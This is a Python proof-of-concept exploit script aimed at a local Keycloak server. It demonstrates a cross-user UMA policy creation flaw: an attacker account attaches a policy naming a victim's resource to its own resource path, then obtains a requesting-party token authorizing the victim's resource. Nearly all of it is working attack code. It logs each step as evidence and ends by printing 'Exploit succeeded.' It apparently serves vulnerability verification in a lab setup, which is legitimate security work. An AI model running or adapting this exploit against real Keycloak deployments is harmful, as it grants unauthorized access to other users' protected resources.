#!/usr/bin/env python3
import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path


BASE_URL = "http://127.0.0.1:8080"
READY_URL = "http://127.0.0.1:9000/health/ready"
SEED_INFO = Path("/opt/keycloak-data/seed-info.json")


class PocError(Exception):
    pass


def http_post_form(url, fields, bearer=None):
    body = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if bearer:
        req.add_header("Authorization", f"Bearer {bearer}")
    return _send(req)


def http_post_json(url, payload, bearer):
    body = json.dumps(payload, sort_keys=True).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", f"Bearer {bearer}")
    return _send(req)


def http_get(url, bearer):
    req = urllib.request.Request(url, method="GET")
    req.add_header("Authorization", f"Bearer {bearer}")
    return _send(req)


def http_delete(url, bearer):
    req = urllib.request.Request(url, method="DELETE")
    req.add_header("Authorization", f"Bearer {bearer}")
    return _send(req)


def _send(req):
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def wait_ready(timeout_seconds=60):
    deadline = time.time() + timeout_seconds
    last_error = None
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(READY_URL, timeout=5) as resp:
                body = resp.read().decode()
                if resp.status == 200:
                    return {"status": resp.status, "body": body}
        except Exception as exc:  # noqa: BLE001
            last_error = str(exc)
        time.sleep(1)
    raise PocError(f"Keycloak did not become ready within {timeout_seconds}s: {last_error}")


def decode_jwt_payload(token):
    payload = token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode()).decode())


def write_json(path, data):
    path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")


def load_seed():
    if not SEED_INFO.exists():
        raise PocError(f"Seed info file not found: {SEED_INFO}")
    return json.loads(SEED_INFO.read_text())


def get_token(token_url, client_id, client_secret, username, password):
    form = {
        "grant_type": "password",
        "client_id": client_id,
        "client_secret": client_secret,
        "username": username,
        "password": password,
    }
    status, body = http_post_form(token_url, form)
    if status != 200:
        raise PocError(f"Failed to get attacker token: HTTP {status} {body}")
    parsed = json.loads(body)
    return parsed["access_token"], {"status": status, "body": parsed, "form": form}


def list_policy_ids(protection_base, resource_id, token):
    url = f"{protection_base}/uma-policy?resource={urllib.parse.quote(resource_id)}"
    status, body = http_get(url, token)
    if status != 200:
        raise PocError(f"Failed to list policies for resource {resource_id}: HTTP {status} {body}")
    parsed = json.loads(body)
    return {item["id"] for item in parsed}, {"status": status, "body": parsed, "url": url}


def delete_policy(protection_base, policy_id, token):
    url = f"{protection_base}/uma-policy/{policy_id}"
    status, body = http_delete(url, token)
    return {"policy_id": policy_id, "status": status, "body": body, "url": url}


def request_rpt(token_url, client_id, client_secret, target_resource_id, bearer):
    form = {
        "grant_type": "urn:ietf:params:oauth:grant-type:uma-ticket",
        "client_id": client_id,
        "client_secret": client_secret,
        "audience": client_id,
        "permission": f"{target_resource_id}#Scope A",
    }
    status, body = http_post_form(token_url, form, bearer=bearer)
    parsed = None
    if body:
        try:
            parsed = json.loads(body)
        except json.JSONDecodeError:
            parsed = {"raw": body}
    return status, parsed, form


def create_malicious_policy(protection_base, path_resource_id, victim_resource_id, bearer):
    payload = {
        "name": f"cross-boundary-poc-{int(time.time())}",
        "resources": [victim_resource_id],
        "scopes": ["Scope A"],
        "users": ["marta"],
    }
    url = f"{protection_base}/uma-policy/{path_resource_id}"
    status, body = http_post_json(url, payload, bearer)
    parsed = None
    if body:
        try:
            parsed = json.loads(body)
        except json.JSONDecodeError:
            parsed = {"raw": body}
    return status, parsed, payload, url


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--evidence-dir", required=True)
    args = parser.parse_args()

    evidence_dir = Path(args.evidence_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)

    ready = wait_ready()
    write_json(evidence_dir / "00_ready.json", ready)

    seed = load_seed()
    write_json(evidence_dir / "01_seed_info.json", seed)

    token_url = seed["token_endpoint"]
    protection_base = seed["protection_api_base"]
    client_id = seed["client"]["client_id"]
    client_secret = seed["client"]["client_secret"]
    attacker_user = seed["attacker"]["username"]
    attacker_password = seed["attacker"]["password"]
    attacker_resource_id = seed["attacker"]["resource_id"]
    victim_resource_id = seed["victim"]["resource_id"]

    attacker_token, token_evidence = get_token(
        token_url, client_id, client_secret, attacker_user, attacker_password
    )
    write_json(evidence_dir / "02_attacker_token.json", token_evidence)

    attacker_policies, attacker_list = list_policy_ids(protection_base, attacker_resource_id, attacker_token)
    victim_policies, victim_list = list_policy_ids(protection_base, victim_resource_id, attacker_token)
    write_json(evidence_dir / "03_attacker_resource_policies.json", attacker_list)
    write_json(evidence_dir / "04_victim_resource_policies.json", victim_list)

    deleted = []
    for policy_id in sorted(attacker_policies & victim_policies):
        deleted.append(delete_policy(protection_base, policy_id, attacker_token))
    write_json(evidence_dir / "05_cleanup_deleted_policies.json", deleted)

    pre_status, pre_body, pre_form = request_rpt(
        token_url, client_id, client_secret, victim_resource_id, attacker_token
    )
    write_json(
        evidence_dir / "06_pre_auth_attempt.json",
        {"status": pre_status, "body": pre_body, "form": pre_form},
    )
    if pre_status == 200:
        raise PocError("Pre-exploit authorization already succeeded after cleanup")
    if pre_status != 403:
        raise PocError(f"Unexpected pre-exploit status: HTTP {pre_status}")

    create_status, create_body, create_payload, create_url = create_malicious_policy(
        protection_base, attacker_resource_id, victim_resource_id, attacker_token
    )
    write_json(
        evidence_dir / "07_policy_create_attempt.json",
        {
            "url": create_url,
            "payload": create_payload,
            "status": create_status,
            "body": create_body,
        },
    )
    if create_status != 200:
        raise PocError(f"Malicious policy creation failed: HTTP {create_status} {create_body}")

    post_status, post_body, post_form = request_rpt(
        token_url, client_id, client_secret, victim_resource_id, attacker_token
    )
    write_json(
        evidence_dir / "08_post_auth_attempt.json",
        {"status": post_status, "body": post_body, "form": post_form},
    )
    if post_status != 200:
        raise PocError(f"Post-exploit authorization did not succeed: HTTP {post_status} {post_body}")

    access_token = post_body.get("access_token")
    if not access_token:
        raise PocError("Post-exploit response did not contain an access token")
    decoded = decode_jwt_payload(access_token)
    write_json(evidence_dir / "09_post_auth_token_payload.json", decoded)

    permissions = decoded.get("authorization", {}).get("permissions", [])
    victim_hits = [
        item
        for item in permissions
        if item.get("rsid") == victim_resource_id and "Scope A" in item.get("scopes", [])
    ]
    if not victim_hits:
        raise PocError("Issued RPT did not contain victim resource authorization")

    summary = {
        "result": "success",
        "base_url": BASE_URL,
        "vulnerability": "cross-user UMA policy creation / authorization bypass",
        "attacker_user": attacker_user,
        "attacker_path_resource_id": attacker_resource_id,
        "victim_resource_id": victim_resource_id,
        "created_policy_id": create_body.get("id"),
        "pre_exploit_status": pre_status,
        "post_exploit_status": post_status,
        "victim_permissions": victim_hits,
        "evidence_dir": str(evidence_dir),
    }
    write_json(evidence_dir / "10_summary.json", summary)

    print("Exploit succeeded.")
    print(f"Evidence: {evidence_dir}")
    print(f"Policy ID: {create_body.get('id')}")
    print(f"Victim resource ID authorized in RPT: {victim_resource_id}")


if __name__ == "__main__":
    try:
        main()
    except PocError as exc:
        print(f"PoC failed: {exc}", file=sys.stderr)
        sys.exit(1)
